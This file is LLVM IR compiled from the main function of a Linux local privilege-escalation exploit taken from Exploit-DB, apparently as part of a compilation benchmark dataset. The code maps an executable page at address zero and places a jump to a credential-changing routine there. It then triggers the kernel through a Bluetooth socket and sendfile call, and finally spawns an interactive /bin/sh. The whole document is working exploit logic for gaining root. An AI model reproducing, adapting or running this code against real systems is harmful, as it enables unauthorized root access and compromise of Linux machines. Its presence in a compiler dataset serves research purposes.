; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9545.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_9545.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.template = private unnamed_addr constant [16 x i8] c"/tmp/tmp.XXXXXX\00", align 16
@uid = common dso_local global i32 0, align 4
@gid = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@change_cred = common dso_local global i64 0, align 8
@PF_BLUETOOTH = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"socket\00", align 1
@.str.2 = private unnamed_addr constant [8 x i8] c"mkstemp\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"unlink\00", align 1
@PAGE_SIZE = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [10 x i8] c"ftruncate\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-i\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [16 x i8], align 16
  store i32 0, i32* %1, align 4
  %6 = bitcast [16 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %6, i8* align 16 getelementptr inbounds ([16 x i8], [16 x i8]* @__const.main.template, i32 0, i32 0), i64 16, i1 false)
  %7 = call i32 (...) @getuid()
  store i32 %7, i32* @uid, align 4
  %8 = call i32 (...) @getgid()
  store i32 %8, i32* @gid, align 4
  %9 = load i32, i32* @PROT_EXEC, align 4
  %10 = load i32, i32* @PROT_READ, align 4
  %11 = or i32 %9, %10
  %12 = load i32, i32* @PROT_WRITE, align 4
  %13 = or i32 %11, %12
  %14 = load i32, i32* @MAP_FIXED, align 4
  %15 = load i32, i32* @MAP_PRIVATE, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @MAP_ANONYMOUS, align 4
  %18 = or i32 %16, %17
  %19 = call i8* @mmap(i32* null, i32 4096, i32 %13, i32 %18, i32 0, i32 0)
  store i8* %19, i8** %2, align 8
  %20 = load i8*, i8** @MAP_FAILED, align 8
  %21 = icmp eq i8* %19, %20
  br i1 %21, label %22, label %26

22:                                               ; preds = %0
  %23 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %24 = load i32, i32* @EXIT_FAILURE, align 4
  %25 = call i32 @exit(i32 %24) #4
  unreachable

26:                                               ; preds = %0
  %27 = load i8*, i8** %2, align 8
  %28 = getelementptr inbounds i8, i8* %27, i64 0
  store i8 -1, i8* %28, align 1
  %29 = load i8*, i8** %2, align 8
  %30 = getelementptr inbounds i8, i8* %29, i64 1
  store i8 36, i8* %30, align 1
  %31 = load i8*, i8** %2, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 2
  store i8 37, i8* %32, align 1
  %33 = load i8*, i8** %2, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 3
  %35 = bitcast i8* %34 to i64*
  store i64 8, i64* %35, align 8
  %36 = load i64, i64* @change_cred, align 8
  %37 = load i8*, i8** %2, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 8
  %39 = bitcast i8* %38 to i64*
  store i64 %36, i64* %39, align 8
  %40 = load i32, i32* @PF_BLUETOOTH, align 4
  %41 = load i32, i32* @SOCK_DGRAM, align 4
  %42 = call i32 @socket(i32 %40, i32 %41, i32 0)
  store i32 %42, i32* %3, align 4
  %43 = icmp eq i32 %42, -1
  br i1 %43, label %44, label %48

44:                                               ; preds = %26
  %45 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  %47 = call i32 @exit(i32 %46) #4
  unreachable

48:                                               ; preds = %26
  %49 = getelementptr inbounds [16 x i8], [16 x i8]* %5, i64 0, i64 0
  %50 = call i32 @mkstemp(i8* %49)
  store i32 %50, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %56

52:                                               ; preds = %48
  %53 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %54 = load i32, i32* @EXIT_FAILURE, align 4
  %55 = call i32 @exit(i32 %54) #4
  unreachable

56:                                               ; preds = %48
  %57 = getelementptr inbounds [16 x i8], [16 x i8]* %5, i64 0, i64 0
  %58 = call i32 @unlink(i8* %57)
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %64

60:                                               ; preds = %56
  %61 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  %62 = load i32, i32* @EXIT_FAILURE, align 4
  %63 = call i32 @exit(i32 %62) #4
  unreachable

64:                                               ; preds = %56
  %65 = load i32, i32* %4, align 4
  %66 = load i32, i32* @PAGE_SIZE, align 4
  %67 = call i32 @ftruncate(i32 %65, i32 %66)
  %68 = icmp eq i32 %67, -1
  br i1 %68, label %69, label %73

69:                                               ; preds = %64
  %70 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %71 = load i32, i32* @EXIT_FAILURE, align 4
  %72 = call i32 @exit(i32 %71) #4
  unreachable

73:                                               ; preds = %64
  %74 = load i32, i32* %3, align 4
  %75 = load i32, i32* %4, align 4
  %76 = load i32, i32* @PAGE_SIZE, align 4
  %77 = call i32 @sendfile(i32 %74, i32 %75, i32* null, i32 %76)
  %78 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0), i32* null)
  %79 = load i32, i32* @EXIT_SUCCESS, align 4
  %80 = call i32 @exit(i32 %79) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @getuid(...) #2

declare dso_local i32 @getgid(...) #2

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @mkstemp(i8*) #2

declare dso_local i32 @unlink(i8*) #2

declare dso_local i32 @ftruncate(i32, i32) #2

declare dso_local i32 @sendfile(i32, i32, i32*, i32) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
